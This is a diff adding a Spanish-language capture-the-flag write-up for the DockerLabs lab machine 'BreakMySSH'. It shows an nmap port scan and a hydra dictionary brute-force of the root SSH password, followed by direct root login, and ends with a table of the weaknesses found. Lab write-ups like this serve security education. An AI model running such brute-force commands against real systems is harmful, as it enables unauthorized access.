@@ -1,0 +1,145 @@
+---
+title: BreakMySSH
+description: Resolución completa de la máquina virtual *BreakMySSH* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **BreakMySSH**, desarrollada por *El Pingüino de Mario* para la plataforma **DockerLabs**, clasificada con una dificultad **Muy Fácil**.
+El laboratorio expone únicamente el servicio SSH, el cual es vulnerable a ataques de fuerza bruta debido al uso de contraseñas débiles para el usuario `root`. 
+Tras identificar el único vector de ataque disponible, se realiza un ataque de diccionario que permite obtener las credenciales correctas y acceder directamente al sistema como el usuario `root`, sin necesidad de escalada de privilegios adicional.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'BreakMySSH',
+    Autor: 'El Pingüino de Mario',
+    Dificultad: 'Muy Fácil',
+    Fecha: '29/05/2024',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip BreakMySSH.zip
+sudo bash auto_deplo.sh BreakMySSH.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1748413004/ipScan_rycz1u.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p BreakMySSH/{content,exploits,nmap,scripts}
+cd BreakMySSH
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **22/tcp** — SSH
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1748413006/Ports_xjfahm.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado del servicio SSH para identificar la versión y posibles vulnerabilidades:
+
+```bash
+nmap -sCV -p22 172.17.0.2 -oN targeted
+```
+
+![Servicios](https://res.cloudinary.com/dewqswzke/image/upload/v1748413009/Services_x9k713.png)
+
+El escaneo revela que el puerto SSH está abierto y el nombre de la máquina sugiere que debemos enfocarnos en este servicio.
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+El puerto SSH (22) es el único servicio expuesto. El nombre de la máquina, "BreakMySSH", sugiere que debemos centrar nuestros esfuerzos en este servicio.
+
+Se realiza un ataque de fuerza bruta con `hydra`, utilizando como usuario `root` y el diccionario `rockyou.txt`:
+
+```bash
+hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4
+```
+
+![Hydra](https://res.cloudinary.com/dewqswzke/image/upload/v1748413002/Hydra_bqlag8.png)
+
+Hydra encuentra la contraseña válida para `root`, lo que nos permite acceder directamente mediante SSH:
+
+```bash
+ssh root@172.17.0.2
+```
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+No es necesaria la escalada de privilegios, ya que se ha obtenido acceso directamente como usuario `root`.
+
+![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1748413007/Root_axvgy7.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "Acceso root permitido vía SSH",
+      severity: "Crítica",
+      impact: "Compromiso total del sistema sin necesidad de escalada"
+    },
+    {
+      vulnerability: "Contraseña débil para usuario root",
+      severity: "Crítica",
+      impact: "Acceso no autorizado mediante fuerza bruta"
+    },
+    {
+      vulnerability: "Falta de políticas de bloqueo por intentos fallidos",
+      severity: "Alta",
+      impact: "Ataques de fuerza bruta ilimitados"
+    },
+    {
+      vulnerability: "Uso de diccionarios comunes en contraseñas",
+      severity: "Media",
+      impact: "Vulnerabilidad a ataques de diccionario"
+    }
+  ]}
+/>
